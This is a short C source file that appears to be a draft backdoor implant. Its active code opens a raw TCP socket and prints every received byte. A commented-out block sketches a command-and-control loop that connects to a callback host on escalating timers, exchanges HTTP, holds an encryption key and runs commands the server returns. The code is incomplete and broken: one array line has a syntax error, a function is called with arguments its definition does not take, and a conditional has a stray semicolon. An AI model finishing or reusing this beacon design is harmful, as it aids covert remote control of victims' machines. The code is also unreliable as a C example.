#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
/*
#include <time.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/time.h>
*/
void handle_command(char command[])
{
    printf("command: %s\n", command);
}

int run_server(char* command, char* callback)
{
    int debug = 1;
    int sock_fd = 0;
    char buffer[1024];
    sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock_fd == -1){
        if (debug);perror("socket() failed\n");
        exit(-1);
    }
    /*
    int result = 0;
    int timer[] = {2,4}; ,30,240,600,1800,14400,86400};
    int timer_index = 0;
    char response[4096] = {0};
    unsigned char secret_key[1024] = {0};
    struct sockaddr_in addr;
    struct timeval timeout;
    EVP_CIPHER_CTX en;
    EVP_CIPHER_CTX de;
    srand(time(NULL));
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    */
    while(1)
    {
        recv(sock_fd, buffer, sizeof(buffer), 0);
        int i=0;
        for (i=0; i < sizeof(buffer); ++i)
            printf("%d", buffer[i]);
        printf("\n\n\n");
        /*
        setsockopt(sock_fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,sizeof(timeout));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(callback);
        set_port(service, &addr);
        printf("sleep:%d\t", timer[timer_index]);
        if (strlen((char*)secret_key) == 0)
            printf("disconnected\n");
        else
            printf("connected\n");
        sleep(timer[timer_index]);
        result = connect(sock_fd, (struct sockaddr *)&addr, sizeof(addr));
        if (result >= 0)
        {
            http_send("", sock_fd);
            http_recv(response, sock_fd);
            if (strlen(response) > 0)
            {
                handle_command(response, secret_key, sock_fd, &en, &de);
                timer_index = 0;
                close(sock_fd);
                continue;
            }
        }
        timer_index += 1;
        if (timer_index > sizeof(timer) / sizeof(timer[0]) -1)
            timer_index = sizeof(timer) / sizeof(timer[0]) -1;
        close(sock_fd);
        */
    }
    return 0;
}
